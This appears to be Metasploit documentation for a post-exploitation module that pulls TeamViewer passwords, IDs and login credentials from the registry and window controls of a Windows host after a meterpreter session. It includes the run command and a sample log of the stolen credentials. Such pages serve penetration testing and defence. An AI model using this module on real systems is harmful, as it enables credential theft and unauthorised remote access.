## Vulnerable Application

  Any Windows host with a `meterpreter` session and TeamViewer 7+
  installed. The following passwords will be searched for and recovered:

  This module allows to enumerate window information to get the control ID
  and Password of TeamViewer. 

  * Options Password -- All module-supported TeamViewer versions (7+)
  * Unattended Password -- TeamViewer versions 7 - 9
  * License Key -- TeamViewer versions 7 - 14

### Installation Steps

  1. Download the latest installer of TeamViewer.
  2. Select "Custom Install With Unattended Password" during

    installation
  3. After installation, navigate to

    `Extra > Options > Security > Advanced > Show Advanced Settings` and
    set the "Options Password"
    * Options can also be exported to a .reg file from here.

## Verification Steps

  1. Get a `meterpreter` session on a Windows host.
  2. Do: ```run post/windows/gather/credentials/teamviewer_passwords```
  3. If the system has registry keys for TeamViewer passwords they will be printed out.
    4. Print the control ID and password.
    5.  If there is a email and password in the login box, the email and password will be printed.

## Options

 **WINDOW_TITLE**

Specify a title for getting the window handle, e.g.:TeamViewer',Default is `TeamViewer`

## Scenarios

```
meterpreter > run post/windows/gather/credentials/teamviewer_passwords 

[*] Finding TeamViewer Passwords on WEQSQUGO-2156
[+] Found Exported Unattended Password: P@$$w0rd
[+] Found Options Password: op*****5
[+] Passwords stored in: /home/blurbdust/.msf4/loot/20200207052401_default_***.***.***.***_host.teamviewer__588749.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are 'zhCN'
[*] TeamViewer's version is '15.3.2682 '
[+] TeamViewer's  title is 'TeamViewer'
[*] Found handle to ID edit box 0x000502a8
[*] Found handle to Password edit box 0x00050248
[+] ID: 1 561 912 659
[+] PASSWORD: AUdbM71f<_
[*] Found handle to Email edit box 0x000501cc
[*] Found handle to Password edit box 0x000501e2
[+] EMAIL: kali-team@qq.com
[+] PASSWORD: Mypassword.
meterpreter >
```
